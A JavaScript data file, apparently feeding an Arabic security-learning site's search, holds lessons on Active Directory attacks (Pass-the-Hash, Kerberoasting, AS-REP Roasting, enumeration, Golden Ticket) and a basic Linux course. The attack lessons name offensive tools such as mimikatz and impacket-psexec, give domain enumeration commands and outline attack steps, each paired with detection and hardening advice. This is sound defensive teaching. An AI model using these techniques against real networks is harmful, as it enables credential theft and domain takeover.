        <p>1. Windows Workstations.</p>
        <p>2. Domain Controllers (في حال ضعف الحماية).</p>
        <p>3. File Servers.</p>

        <h3>ما الذي يمكن فعله بعد النجاح؟</h3>

        <p>1. الوصول إلى الشبكة الداخلية.</p>
        <p>2. قراءة الملفات الحساسة.</p>
        <p>3. تنفيذ أوامر عن بعد.</p>
        <p>4. الانتقال الجانبي (Lateral Movement).</p>

        <h3>أدوات شائعة (للاختبار الأمني):</h3>

        <pre><code>impacket-psexec
crackmapexec
pth-toolkit
mimikatz
wmiexec.py</code></pre>

        <h3>مثال سيناريو:</h3>

        <p>1. المهاجم يحصل على NTLM Hash من جهاز ضعيف.</p>
        <p>2. يستخدم نفس الهاش لمحاولة تسجيل الدخول إلى أجهزة أخرى.</p>
        <p>3. يتم قبول المصادقة دون الحاجة لكلمة المرور.</p>

        <h3>أنواع NTLM المستخدمة:</h3>

        <p>1. NTLMv1 (ضعيف).</p>
        <p>2. NTLMv2 (أكثر شيوعاً لكن ما زال قابل للاستخدام في PTH).</p>

        <h3>لماذا يعمل الهجوم؟</h3>

        <p>بسبب تصميم NTLM الذي يعتمد على hash-based authentication بدلاً من password verification المباشر.</p>

        <h3>علامات وجود خطر:</h3>

        <p>1. استخدام NTLM بدلاً من Kerberos.</p>
        <p>2. عدم تفعيل SMB Signing.</p>
        <p>3. وجود حسابات بإعادة استخدام كلمات مرور.</p>

        <h3>طرق الكشف:</h3>

        <p>1. مراقبة تسجيلات الدخول غير الطبيعية.</p>
        <p>2. تحليل authentication logs.</p>
        <p>3. اكتشاف logins من أجهزة متعددة بنفس الحساب.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. تعطيل NTLM واستخدام Kerberos.</b></p>
        <p><b>2. تفعيل Credential Guard في Windows.</b></p>
        <p><b>3. استخدام Multi-Factor Authentication (MFA).</b></p>
        <p><b>4. تقليل صلاحيات الحسابات.</b></p>
        <p><b>5. مراقبة LSASS وحمايته.</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>Enable Kerberos Only Authentication
Enable Credential Guard
Restrict NTLM usage</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر Pass The Hash Attack من أخطر هجمات Windows لأنها تسمح بتجاوز كلمات المرور بالكامل، مما يجعل أي نظام يعتمد على NTLM عرضة للاختراق إذا لم يتم تأمينه بشكل صحيح.</p>
    `
},




{
    "title": "Kerberoasting في Active Directory",
    "summary": `
        <p>تُعتبر <b>Kerberoasting</b> واحدة من أشهر تقنيات الهجوم في بيئات <b>Active Directory</b>، حيث يستهدف المهاجم حسابات الخدمات (Service Accounts) لاستخراج تذاكر Kerberos (TGS) ثم محاولة كسرها خارجياً للحصول على كلمات المرور.</p>

        <p>تكمن خطورة هذا الهجوم في أنه لا يحتاج إلى صلاحيات عالية داخل الشبكة، بل يمكن تنفيذه من حساب مستخدم عادي إذا كانت البيئة غير مؤمنة بشكل جيد.</p>

        <h3>ما هو Kerberoasting ؟</h3>

        <p>هو أسلوب يقوم على طلب تذكرة خدمة Kerberos (TGS) لأي Service Principal Name (SPN)، ثم استخراج هذه التذكرة ومحاولة تحليلها أو كسرها Offline.</p>

        <h3>كيف يعمل Kerberos بشكل مبسط؟</h3>

        <p>في نظام المصادقة داخل <b>Active Directory</b>، يتم استخدام Kerberos لتأكيد هوية المستخدمين والخدمات عبر تذاكر مشفرة بدل كلمات المرور المباشرة.</p>

        <p>عندما يريد المستخدم الوصول إلى خدمة معينة، يحصل على TGS (Ticket Granting Service) مشفر باستخدام مفتاح مشتق من كلمة مرور حساب الخدمة.</p>

        <h3>الفكرة الأساسية في الهجوم:</h3>

        <p>إذا كانت كلمة مرور حساب الخدمة ضعيفة، يمكن كسر التذكرة (TGS) لأنها مشفرة باستخدام نفس كلمة المرور.</p>

        <h3>لماذا يحدث هذا الضعف؟</h3>

        <p>1. استخدام كلمات مرور ضعيفة لحسابات الخدمات.</p>
        <p>2. عدم تدوير كلمات مرور Service Accounts.</p>
        <p>3. وجود SPNs كثيرة مرتبطة بحسابات ذات صلاحيات عالية.</p>

        <h3>ما هو SPN ؟</h3>

        <p>Service Principal Name هو معرف فريد للخدمات داخل <b>Active Directory</b> يربط الخدمة بحساب مستخدم.</p>

        <h3>كيف يتم استغلال Kerberoasting (مفاهيميًا)؟</h3>

        <p>1. المهاجم يحدد حسابات تحتوي على SPN داخل الدومين.</p>
        <p>2. يطلب TGS لهذه الحسابات من Kerberos.</p>
        <p>3. يحصل على تذاكر مشفرة.</p>
        <p>4. يقوم بمحاولة كسر التشفير Offline.</p>

        <h3>لماذا هذا خطير؟</h3>

        <p>لأن الكسر يتم خارج الشبكة، وبالتالي لا يتم اكتشافه بسهولة من أنظمة الحماية الداخلية.</p>

        <h3>ما الذي يمكن الحصول عليه بعد النجاح؟</h3>

        <p>1. كلمات مرور Service Accounts.</p>
        <p>2. حسابات بصلاحيات Domain Admin (في بعض الحالات).</p>
        <p>3. إمكانية التوسع داخل الشبكة (Lateral Movement).</p>

        <h3>أنواع الحسابات المستهدفة:</h3>

        <p>1. SQL Service Accounts.</p>
        <p>2. Web Service Accounts.</p>
        <p>3. Application Service Accounts.</p>

        <h3>علامات وجود خطر:</h3>

        <p>1. كلمات مرور ضعيفة لحسابات الخدمات.</p>
        <p>2. SPNs مرتبطة بحسابات مرتفعة الصلاحيات.</p>
        <p>3. عدم استخدام Managed Service Accounts.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. استخدام كلمات مرور قوية جداً لحسابات الخدمات.</b></p>
        <p><b>2. استخدام gMSA (Group Managed Service Accounts).</b></p>
        <p><b>3. تقليل استخدام SPNs غير الضرورية.</b></p>
        <p><b>4. تدوير كلمات مرور الخدمات بشكل دوري.</b></p>
        <p><b>5. مراقبة طلبات Kerberos غير الطبيعية.</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>Use gMSA for services
Enforce strong passwords for service accounts
Audit SPN usage regularly</code></pre>

        <h3>أهمية الهجوم:</h3>

        <p>تُعتبر Kerberoasting من أخطر هجمات Active Directory لأنها تستهدف نقطة ضعف شائعة جداً وهي حسابات الخدمات، وغالباً ما تؤدي إلى تصعيد صلاحيات داخل الدومين إذا تم كسر كلمة مرور حساب حساس.</p>
    `
},




{
    "title": "AS-REP Roasting Attack",
    "summary": `
        <p>تُعتبر <b>AS-REP Roasting</b> من هجمات <b>Active Directory</b> التي تستهدف حسابات المستخدمين التي لا تتطلب مسبقاً المصادقة (Pre-Authentication) في Kerberos.</p>

        <p>الفكرة الأساسية هي استخراج بيانات مشفرة من رد خادم Kerberos (AS-REP) ثم محاولة كسرها Offline للحصول على كلمة المرور.</p>

        <h3>ما هو AS-REP ؟</h3>

        <p>AS-REP هو رد يصدر من خادم Kerberos عند محاولة تسجيل الدخول، ويحتوي على بيانات مشفرة تعتمد على كلمة مرور المستخدم.</p>

        <h3>ما هي Pre-Authentication ؟</h3>

        <p>هي خطوة أمان في Kerberos تُجبر المستخدم على إثبات هويته قبل أن يحصل على تذكرة الدخول (TGT).</p>

        <p>إذا تم تعطيلها لحساب معين، يصبح الحساب عرضة لهجوم AS-REP Roasting.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما يتم إعداد حساب في Active Directory مع خيار:</p>

        <pre><code>Do not require Kerberos preauthentication</code></pre>

        <p>هذا يسمح لأي شخص بطلب رد AS-REP مشفر دون الحاجة لإثبات الهوية.</p>

        <h3>الفكرة الأساسية للهجوم:</h3>

        <p>بدلاً من كسر كلمة المرور مباشرة، يتم استخراج التشفير من AS-REP ثم محاولة كسره Offline.</p>

        <h3>كيف يعمل Kerberos في هذه الحالة؟</h3>

        <p>1. المهاجم يطلب TGT لحساب معين.</p>
        <p>2. الخادم يرسل AS-REP مشفر.</p>
        <p>3. التشفير يعتمد على كلمة مرور المستخدم.</p>
        <p>4. يتم حفظ الرد وتحليله خارج الشبكة.</p>

        <h3>لماذا هذا خطير؟</h3>

        <p>لأن العملية تتم بدون تسجيل دخول أو تنبيه، مما يجعل الاكتشاف صعباً.</p>

        <h3>ما الذي يمكن الحصول عليه؟</h3>

        <p>1. كلمات مرور المستخدمين الضعفاء.</p>
        <p>2. حسابات يمكن استخدامها في الوصول إلى الشبكة.</p>
        <p>3. نقاط دخول لتصعيد الصلاحيات.</p>

        <h3>متى تكون الحسابات معرضة للخطر؟</h3>

        <p>1. عند تعطيل Kerberos Pre-Authentication.</p>
        <p>2. عند استخدام كلمات مرور ضعيفة.</p>
        <p>3. عند وجود حسابات قديمة أو غير مراقبة.</p>

        <h3>أنواع الحسابات المستهدفة:</h3>

        <p>1. المستخدمين العاديين.</p>
        <p>2. الحسابات القديمة (Legacy Accounts).</p>
        <p>3. الحسابات ذات الإعدادات الضعيفة.</p>

        <h3>علامات وجود خطر:</h3>

        <p>1. وجود حسابات بدون pre-authentication.</p>
        <p>2. كلمات مرور ضعيفة أو قصيرة.</p>
        <p>3. عدم مراقبة حسابات AD بشكل دوري.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. تفعيل Kerberos Pre-Authentication لجميع الحسابات.</b></p>
        <p><b>2. استخدام كلمات مرور قوية ومعقدة.</b></p>
        <p><b>3. إزالة الحسابات غير المستخدمة.</b></p>
        <p><b>4. تطبيق سياسة كلمة مرور صارمة في Active Directory.</b></p>
        <p><b>5. مراقبة إعدادات الحسابات بشكل دوري.</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>Enable Pre-Authentication for all users
Enforce password complexity policies
Audit AD user settings regularly</code></pre>

        <h3>الفرق بين AS-REP Roasting و Kerberoasting:</h3>

        <p><b>AS-REP Roasting:</b> يستهدف المستخدمين الذين لا يستخدمون pre-authentication.</p>
        <p><b>Kerberoasting:</b> يستهدف حسابات الخدمات (Service Accounts).</p>

        <h3>خطورة الهجوم:</h3>

        <p>تُعتبر AS-REP Roasting خطيرة لأنها تسمح للمهاجم بالحصول على بيانات قابلة للكسر دون الحاجة لأي صلاحيات مسبقة داخل الشبكة، مما يجعلها نقطة دخول شائعة في اختراقات Active Directory.</p>
    `
},



{
    "title": "Active Directory Enumeration",
    "summary": `
        <p>تُعتبر <b>Active Directory Enumeration</b> خطوة أساسية في مرحلة الاستطلاع (Reconnaissance) داخل بيئات Windows Enterprise، حيث يقوم المهاجم بجمع معلومات تفصيلية عن الدومين (Domain)، المستخدمين، الأجهزة، والسياسات لفهم بنية الشبكة قبل أي استغلال.</p>

        <p>كلما كانت عملية الـ Enumeration أعمق، زادت قدرة المهاجم على اكتشاف نقاط ضعف تؤدي لاحقاً إلى <b>Privilege Escalation</b> أو <b>Lateral Movement</b>.</p>

        <h3>ما هو Active Directory ؟</h3>

        <p>هو نظام إدارة مركزي من Microsoft يستخدم لإدارة المستخدمين، الأجهزة، والسياسات داخل الشبكات الكبيرة (Enterprise Networks).</p>

        <h3>هدف Enumeration:</h3>

        <p>1. فهم بنية الدومين.</p>
        <p>2. اكتشاف المستخدمين والمجموعات.</p>
        <p>3. تحديد الأجهزة والخدمات.</p>
        <p>4. البحث عن إعدادات ضعيفة.</p>

        <h3>أنواع المعلومات التي يتم جمعها:</h3>

        <h3>1. Domain Information</h3>

        <p>يشمل اسم الدومين، الـ Domain Controllers، ومستوى الوظائف (Functional Level).</p>

        <h3>2. User Enumeration</h3>

        <p>استخراج أسماء المستخدمين، الحسابات الإدارية، والسياسات الخاصة بكلمات المرور.</p>

        <h3>3. Group Enumeration</h3>

        <p>معرفة المجموعات الحساسة مثل:</p>

        <pre><code>Domain Admins
Enterprise Admins
Remote Desktop Users</code></pre>

        <h3>4. Computer Enumeration</h3>

        <p>اكتشاف الأجهزة المرتبطة بالدومين وأدوارها.</p>

        <h3>5. Shared Resources</h3>

        <p>اكتشاف الملفات المشتركة (SMB Shares) داخل الشبكة.</p>

        <h3>6. Policy Enumeration</h3>

        <p>فحص Group Policies (GPOs) لمعرفة إعدادات الأمان.</p>

        <h3>كيف يحدث Enumeration؟</h3>

        <p>يتم عبر بروتوكولات مثل:</p>

        <p>1. LDAP</p>
        <p>2. SMB</p>
        <p>3. RPC</p>
        <p>4. Kerberos</p>

        <h3>أوامر شائعة (تحليلية):</h3>

        <pre><code>net user /domain
net group /domain
nltest /domain_trusts
whoami /groups</code></pre>

        <h3>أدوات Enumeration:</h3>

        <pre><code>BloodHound
SharpHound
enum4linux
crackmapexec
ldapsearch
PowerView</code></pre>

        <h3>ما الذي يبحث عنه المهاجم؟</h3>

        <p>1. حسابات ضعيفة أو قديمة.</p>
        <p>2. علاقات ثقة (Trust Relationships).</p>
        <p>3. حسابات Service Accounts.</p>
        <p>4. صلاحيات زائدة (Over-privileged users).</p>

        <h3>لماذا هذه الخطوة مهمة؟</h3>

        <p>لأن Active Directory هو قلب الشبكة، وأي خطأ في فهم بنيته قد يؤدي إلى اختراق كامل للدومين.</p>

        <h3>مثال سيناريو:</h3>

        <p>1. جمع أسماء المستخدمين.</p>
        <p>2. تحديد حسابات Admin.</p>
        <p>3. اكتشاف SPNs أو خدمات ضعيفة.</p>
        <p>4. الانتقال إلى Kerberoasting أو Pass-the-Hash.</p>

        <h3>علامات ضعف في AD:</h3>

        <p>1. مستخدمين بصلاحيات زائدة.</p>
        <p>2. كلمات مرور ضعيفة.</p>
        <p>3. خدمات غير مؤمنة.</p>
        <p>4. غياب المراقبة.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. تطبيق مبدأ أقل صلاحية (Least Privilege).</b></p>
        <p><b>2. مراقبة LDAP و SMB traffic.</b></p>
        <p><b>3. تعطيل الحسابات غير المستخدمة.</b></p>
        <p><b>4. تفعيل auditing على Active Directory.</b></p>
        <p><b>5. استخدام Group Policy بشكل صارم.</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>Enable Advanced Audit Policy
Restrict anonymous LDAP queries
Enforce strong password policies</code></pre>

        <h3>خطورة Enumeration:</h3>

        <p>تُعتبر Active Directory Enumeration خطوة تمهيدية حاسمة، لأنها لا تقوم بالاختراق مباشرة، لكنها توفر للمهاجم خريطة كاملة للشبكة تساعده على تنفيذ هجمات أكثر خطورة لاحقاً مثل Kerberoasting وPass-the-Hash وPrivilege Escalation.</p>
    `
},



{
    "title": "Golden Ticket Attack",
    "summary": `
        <p>تُعتبر <b>Golden Ticket Attack</b> واحدة من أخطر الهجمات في بيئة <b>Active Directory</b>، لأنها تمنح المهاجم قدرة إنشاء تذاكر Kerberos مزيفة (TGTs) تسمح له بالوصول إلى أي مورد داخل الدومين تقريباً دون الحاجة لإعادة المصادقة.</p>

        <p>الخطورة الحقيقية في هذه الهجمة أنها تستهدف <b>الثقة الأساسية في Kerberos</b> داخل الدومين، وليس مجرد حساب مستخدم عادي.</p>

        <h3>ما هو Golden Ticket ؟</h3>

        <p>هو تذكرة Kerberos مزيفة (TGT) يتم إنشاؤها باستخدام مفتاح حساس جداً يسمى <b>KRBTGT Hash</b> الخاص بـ Domain Controller.</p>

        <h3>ما هو KRBTGT ؟</h3>

        <p>هو حساب خدمة داخل Active Directory مسؤول عن توقيع وتشفير جميع تذاكر Kerberos في الدومين.</p>

        <p>إذا تم الحصول على Hash الخاص به، يمكن إنشاء تذاكر Kerberos صالحة بشكل غير محدود.</p>

        <h3>كيف تعمل الفكرة بشكل مبسط؟</h3>

        <p>Kerberos يعتمد على تذاكر موقعة من KRBTGT للتحقق من الهوية.</p>

        <p>إذا استطاع المهاجم تقليد هذا التوقيع، يمكنه إنشاء تذاكر تبدو شرعية للنظام.</p>

        <h3>لماذا هذه الهجمة خطيرة جداً؟</h3>

        <p>1. لا تحتاج كلمة مرور المستخدم.</p>
        <p>2. يمكنها منح صلاحيات Domain Admin.</p>
        <p>3. يصعب اكتشافها لأنها تعتمد على تذاكر تبدو شرعية.</p>
        <p>4. يمكن أن تبقى فعالة لفترة طويلة داخل الشبكة.</p>

        <h3>ما الذي يجعلها ممكنة؟</h3>

        <p>الشرط الأساسي هو الوصول إلى:</p>

        <pre><code>KRBTGT Account Hash</code></pre>

        <p>هذا الحساب هو "المفتاح الذهبي" لنظام Kerberos.</p>

        <h3>ما الذي يمكن فعله بعد ذلك؟</h3>

        <p>1. إنشاء تذاكر Kerberos مزيفة لأي مستخدم.</p>
        <p>2. الوصول إلى أي جهاز داخل الدومين.</p>
        <p>3. تجاوز سياسات المصادقة.</p>
        <p>4. الحفاظ على وصول دائم (Persistence).</p>

        <h3>كيف يعمل Kerberos بشكل مرتبط بالهجوم؟</h3>

        <p>1. المستخدم يطلب TGT.</p>
        <p>2. Domain Controller يقوم بتوقيعه باستخدام KRBTGT.</p>
        <p>3. يتم استخدام التذكرة للوصول إلى الخدمات.</p>

        <p>في Golden Ticket، يتم تجاوز الخطوة الأولى والثانية عبر إنشاء تذكرة مزيفة مباشرة.</p>

        <h3>ما الفرق بين Golden Ticket و Silver Ticket ؟</h3>

        <p><b>Golden Ticket:</b> يعتمد على KRBTGT ويمنح وصول شامل للدومين.</p>
        <p><b>Silver Ticket:</b> يستهدف خدمة معينة فقط (Service-specific ticket).</p>

        <h3>لماذا يصعب اكتشافه؟</h3>

        <p>لأن التذاكر المزيفة تبدو مثل التذاكر الحقيقية داخل Kerberos، ولا يتم التحقق من مصدر إنشائها بشكل مباشر في كل الحالات.</p>

        <h3>علامات وجود خطر:</h3>

        <p>1. جلسات طويلة بشكل غير طبيعي.</p>
        <p>2. وصول غير مبرر إلى موارد متعددة.</p>
        <p>3. استخدام حسابات بصلاحيات عالية بشكل غير طبيعي.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. حماية KRBTGT Account بشكل صارم.</b></p>
        <p><b>2. تغيير KRBTGT password بشكل دوري (Double Reset).</b></p>
        <p><b>3. مراقبة Kerberos ticket anomalies.</b></p>
        <p><b>4. تطبيق Tiered Admin Model.</b></p>
        <p><b>5. استخدام Advanced AD auditing.</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>Reset KRBTGT password twice
Enable Kerberos auditing
Restrict Domain Admin usage</code></pre>

        <h3>خطورة الهجمة:</h3>

        <p>تُعتبر Golden Ticket Attack من أخطر هجمات Active Directory لأنها تمنح المهاجم "مفتاح الملكية الكامل" للدومين، مما يعني السيطرة شبه الكاملة على جميع الأنظمة والمستخدمين والخدمات داخل الشبكة.</p>
    `
},


];






// كورس لينكس الشامل المقسم بالتوافق مع بنية محرك البحث (بدون صور)
const linuxCourseDatabase = [
    {
        "title": "مقدمة في نظام لينكس وبنيته الأساسية (Linux Architecture)",
        "summary": `
            <p>نظام لينكس (Linux) هو نظام تشغيل مفتوح المصدر (Open Source) يعتمد في أساسه على بـنية قوية وعازلة توفر أماناً واستقراراً عالياً، وهو النظام المهيمن على تشغيل الخوادم (Servers) وأنظمة الاختراق والشبكات.</p>
            <h3>بنية النظام الأساسية (Architecture):</h3>
            <p>يتكون النظام من أربع طبقات رئيسية تعمل معاً بانسجام:</p>
            <p>1. <b>الأجهزة (Hardware):</b> المكونات المادية مثل المعالج (CPU)، الذاكرة (RAM)، والأقراص الصلبة.</p>
            <p>2. <b>النواة (Kernel):</b> قلب نظام التشغيل، وهي المسؤولة عن إدارة العتاد وتوزيع موارد النظام وجدولة العمليات.</p>
            <p>3. <b>مفسر الأوامر (Shell):</b> الواجهة النصية التي تستقبل الأوامر من المستخدم وتترجمها إلى لغة تفهمها النواة (مثل بيئة Bash).</p>
            <p>4. <b>التطبيقات والمستخدم (Applications/User Space):</b> البرامج والأدوات التي يتفاعل معها المستخدم مباشرة.</p>
            <h3>أمر فحص تفاصيل النواة والنظام الأساسي:</h3>
            <pre><code>uname -a</code></pre>
            <p>يقوم الأمر <code>uname -a</code> بطباعة اسم النواة، وإصدارها، ومعمارية المعالج (مثل x86_64) وتاريخ بناء التوزيعة الحالية.</p>
        `
    },
    {
        "title": "نظام الملفات والملفات القياسية (Linux File System Hierarchy)",
        "summary": `
            <p>على عكس أنظمة ويندوز التي تعتمد على الأقراص (C: / D:)، يبدأ نظام لينكس من شجرة ملفات موحدة تنطلق من الجذر الرئيسي ويرمز له بالرمز السلش <code>/</code>.</p>
            <h3>المجلدات الحيوية في النظام ودورها:</h3>
            <p><b>/bin :</b> يحتوي على الأوامر والبرامج الأساسية التي يحتاجها كافة مستخدمي النظام (مثل ls, cd, cp).</p>
            <p><b>/sbin :</b> يحتوي على أوامر النظام الحساسة المخصصة لمدير النظام Root فقط لإدارة العتاد والصيانة.</p>
            <p><b>/etc :</b> مجلد التكوين (Configuration Files)، ويحتوي على كافة ملفات إعدادات النظام والخدمات الثابتة.</p>
            <p><b>/var :</b> يحتوي على البيانات المتغيرة ديناميكياً أثناء تشغيل النظام مثل ملفات السجلات (Logs) وقواعد البيانات.</p>
            <p><b>/home :</b> المجلد الشخصي للمستخدمين العاديين، حيث يمتلك كل مستخدم مجلداً فرعياً خاصاً به لحفظ ملفاته.</p>
            <h3>أمر استعراض المسار الحالي والشجرة:</h3>
            <pre><code>pwd\nls -lh /</code></pre>
            <p>الأمر <code>pwd</code> يطبع المسار الكامل للمجلد الذي تقف فيه حالياً، بينما يطبع <code>ls -lh /</code> محتويات الجذر بشكل تفصيلي ومقروء.</p>
        `
    },
    {
        "title": "إدارة الصلاحيات والمستخدمين والأمان (Linux Permissions & chmod)",
        "summary": `
            <p>يعتمد الأمان في لينكس على نظام صلاحيات صارم ومحدد لكل ملف أو مجلد، وينقسم المستخدمون إلى ثلاثة أنواع:</p>
            <p>1. المالك (User/Owner) ويرمز له بـ <b>u</b></p>
            <p>2. المجموعة (Group) ويرمز لها بـ <b>g</b></p>
            <p>3. الآخرون (Others) ويرمز لهم بـ <b>o</b></p>
            <h3>أنواع الصلاحيات وتمثيلها الرقمي:</h3>
            <p><b>القراءة (Read - r):</b> تمثل بالرقم 4. تسمح باستعراض محتوى الملف أو المجلد.</p>
            <p><b>الكتابة (Write - w):</b> تمثل بالرقم 2. تسمح بالتعديل، الحذف، أو الإضافة.</p>
            <p><b>التنفيذ (Execute - x):</b> تمثل بالرقم 1. تسمح بتشغيل الملف كبرنامج أو الدخول للمجلد.</p>
            <h3>أمثلة عملية على تعديل الصلاحيات:</h3>
            <pre><code>chmod 755 script.sh\nchmod 600 id_rsa</code></pre>
            <p>الأمر الأول <code>755</code> يعني صلاحية كاملة للمالك (4+2+1=7) وقراءة وتنفيذ للمجموعة والآخرين (4+1=5).</p>
            <p>الأمر الثاني <code>600</code> يعني قراءة وكتابة للمالك فقط (4+2=6) وحظر كامل للآخرين، وهو التنسيق القياسي لحماية مفاتيح الـ SSH الحساسة.</p>
        `
    },
    {
        "title": "إدارة العمليات ومراقبة أداء النظام (Process Management)",
        "summary": `
            <p>كل برنامج يتم تشغيله في بيئة لينكس يتحول إلى عملية (Process) في الخلفية أو الأمام، ويمنح النظام كل عملية رقماً تعريفياً فريداً يُعرف بـ PID (Process ID).</p>
            <h3>أدوات المراقبة المباشرة:</h3>
            <p>الأمر <b>top</b> أو <b>htop</b> يوفر واجهة حية لمراقبة استهلاك المعالج (CPU) والذاكرة عشوائية الاستخدام (RAM) والعمليات الأعلى استهلاكاً.</p>
            <h3>التحكم في العمليات وإنهائها:</h3>
            <pre><code>ps aux | grep nginx\nkill -9 PID</code></pre>
            <p>الأمر <code>ps aux</code> يستعرض كافة العمليات الجارية في النظام، ويتم تمرير المخرجات عبر الـ Pipe لأمر <code>grep</code> للبحث عن خدمة nginx وتحديد رقم الـ PID الخاص بها، ومن ثم استخدام <code>kill -9</code> لإجبار النظام على إنهاء العملية فوراً في حال تعليقها.</p>
        `
    },
    {
        "title": "إدارة الشبكات وفحص الاتصالات وحظر المنافذ (Linux Networking)",
        "summary": `
            <p>يتضمن لينكس أدوات مدمجة قوية لإدارة بطاقات الشبكة، فحص الاتصالات، والتحقق من المنافذ (Ports) المفتوحة والمستمعة في الخلفية.</p>
            <h3>الأوامر الأساسية لفحص الشبكة:</h3>
            <p><b>ss -tulwn :</b> يستعرض كافة المنافذ الرقمية (TCP/UDP) المفتوحة والتي تستمع حالياً للاتصالات القادمة (Listening Ports).</p>
            <p><b>ip a :</b> يعرض تفاصيل بطاقات الشبكة وعناوين الـ IP المحلية (IPv4/IPv6) المرتبطة بالجهاز.</p>
            <h3>أوامر عملية للتحقق من الاتصال والمنافذ:</h3>
            <pre><code>ip a\nss -tulwn\nping -c 4 google.com</code></pre>
            <p>يُستخدم أمر <code>ping -c 4</code> لإرسال 4 حزم اختبارية فقط إلى الخادم البعيد للتحقق من جودة واستقرار الاتصال بالإنترنت وزمن الاستجابة دون استمرار العملية بلا نهاية.</p>
        `
    },
    {
        "title": "إدارة الحزم وتثبيت البرامج (Package Management & Repositories)",
        "summary": `
            <p>تعتمد توزيعات لينكس على مستودعات رسمية (Repositories) لتحميل وتثبيت البرامج والأدوات الأمنية والتحديثات بشكل آمن لضمان سلامة الملفات.</p>
            <h3>الفرق بين الأنظمة الشهيرة في إدارة الحزم:</h3>
            <p>1. التوزيعات المعتمدة على دبيان (Debian/Ubuntu/Kali) تستخدم مدير الحزم <b>APT</b>.</p>
            <p>2. التوزيعات المعتمدة على ريد هات (RedHat/CentOS/Fedora) تستخدم مدير الحزم <b>DNF</b> أو <b>YUM</b>.</p>
            <h3>الأوامر القياسية لتحديث النظام وتثبيت الأدوات:</h3>
            <pre><code>sudo apt update && sudo apt upgrade -y\nsudo apt install curl wget git -y</code></pre>
            <p>الأمر <code>sudo apt update</code> يقوم بجلب أحدث قوائم البرامج من المستودعات، بينما يقوم <code>upgrade</code> بتحديث الحزم الحالية فعلياً مع الموافقة التلقائية عبر خيار <code>-y</code> لتسريع الأتمتة.</p>
        `
    }
];

// الخطوة الهامة: دمج كل المصفوفات (الثغرات واللينكس) في متغير واحد متصل بـ search-engine.js
const allVulnerabilities = [...vulnerabilitiesDatabase, ...linuxCourseDatabase];
